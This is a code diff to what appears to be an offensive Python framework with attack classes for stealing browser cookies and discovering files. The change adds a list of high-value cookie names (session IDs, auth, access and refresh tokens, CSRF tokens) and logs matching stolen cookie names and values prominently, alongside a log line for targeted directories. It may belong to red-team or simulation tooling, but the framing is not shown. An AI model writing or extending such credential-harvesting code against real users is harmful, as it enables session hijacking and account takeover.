@@ -27,6 +27,24 @@ class CookieAttack(Attack):
     def __init__(self, executor: "AttackExecutor", attack_payload: "AttackPayload") -> None:
         super().__init__(executor, attack_payload)
 
+        self.important_cookie_names = {
+            'sessionid',  # Generic session identifier
+            'userid',  # Generic user identifier
+            'username',  # User's name
+            'csrftoken',  # Cross-Site Request Forgery prevention token
+            'auth_token',  # Authentication token
+            'access_token',  # Access token for OAuth 2.0
+            'refresh_token',  # Refresh token for OAuth 2.0
+            'sid',  # Session ID
+            'connect.sid',  # Session ID used by some frameworks
+            'JSESSIONID',  # Java J2EE session identifier
+            'ASP.NET_SessionId',  # ASP.NET session identifier
+            '__cfduid',  # Cloudflare service token
+            '_ga',  # Google Analytics
+            '_gid',  # Google Analytics
+            '_gat',  # Google Analytics
+        }
+
     def job(self):
         self.info("Cookie Attack initiating..")
         
@@ -48,10 +66,12 @@ class CookieAttack(Attack):
             self.warn(f"Browser not applicable to gather cookie resources. [Chrome//Firefox] ~ {browser} found ~")
 
         for cookie in cookies:
-            self.log_data(f"Cookie [Name]: {cookie.name} [Value]: {cookie.value}")
+            if cookie.name in self.important_cookie_names:
+                self.log_data(f"(!)> Cookie [Name]: {cookie.name} [Value]: {cookie.value}")
+            else:
+                self.info(f"Cookie [Name]: {cookie.name} [Value]: {cookie.value}")
 
         self.info("Cookie attack completed.")
-        print("🎊 Cookie attack completed ! 🎊")
 
     def _detect_browser(self):
         # Detect the browser based on available cookie files
@@ -159,6 +179,7 @@ class FileFolderDiscoveryAttack(Attack):
         self.info("File Folder Discovery Attack initiating..")
 
         directories = self._get_directories()
+        self.info(f"Fetching directories decided: {directories}")
         for directory in directories:
             self._discover_files_in_directory(directory)
         
